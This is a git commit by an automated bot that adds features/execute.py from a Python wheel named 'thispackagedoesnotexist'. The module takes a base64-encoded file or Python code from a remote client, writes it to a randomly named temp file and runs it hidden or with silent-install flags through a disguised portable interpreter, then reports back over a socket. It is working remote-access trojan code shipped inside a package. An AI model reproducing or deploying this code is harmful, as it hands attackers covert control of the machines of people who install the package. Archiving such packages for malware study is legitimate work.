40d2c2eb932c13383ac9a3281eaf814241f31043
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-02-02 15:05:43 +0000

    Add package thispackagedoesnotexist/0.4.0/thispackagedoesnotexist-0.4.0-py3-none-any.whl

---
+++ packages/thispackagedoesnotexist/thispackagedoesnotexist-0.4.0-py3-none-any.whl/thispackagedoesnotexist/features/execute.py
@@ -0,0 +1,50 @@
+import os
+import base64
+import tempfile
+import random
+import string
+import win32process
+import win32con
+
+def execute_file(client, data, converter):
+    try:
+        base64_file = data["execute_file"]
+        visibility = data["visibility"]
+        file_type = data["file_type"]
+        decoded_file = base64.b64decode(base64_file)
+        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python', 'pyportable', 'python.exe')
+
+        temp_dir = tempfile.gettempdir()
+        random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + file_type
+        full_path = os.path.join(temp_dir, random_filename)
+
+        with open(full_path, "wb") as f:
+            f.write(decoded_file)
+
+        startupinfo = win32process.STARTUPINFO()
+        if visibility != "Visible":
+            startupinfo.dwFlags |= win32process.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = win32con.SW_HIDE
+
+        if file_type == ".exe":
+            silent_flags = ["/S", "/quiet", "/silent", "/norestart"]
+            command = f'"{full_path}" ' + " ".join(silent_flags)
+        else:
+            command = f'"{python_library_path}" -c "{decoded_file.decode("utf-8")}"'
+
+        win32process.CreateProcess(
+            None, 
+            command, 
+            None, 
+            None, 
+            False, 
+            win32con.CREATE_NO_WINDOW if visibility.lower() != "visible" else 0, 
+            None, 
+            None, 
+            startupinfo
+        )
+
+        client.emit('message', converter.encode({"execute_file": "File executed successfully."}))
+
+    except Exception as e:
+        client.emit('message', converter.encode({"execute_file_logger": str(e)}))
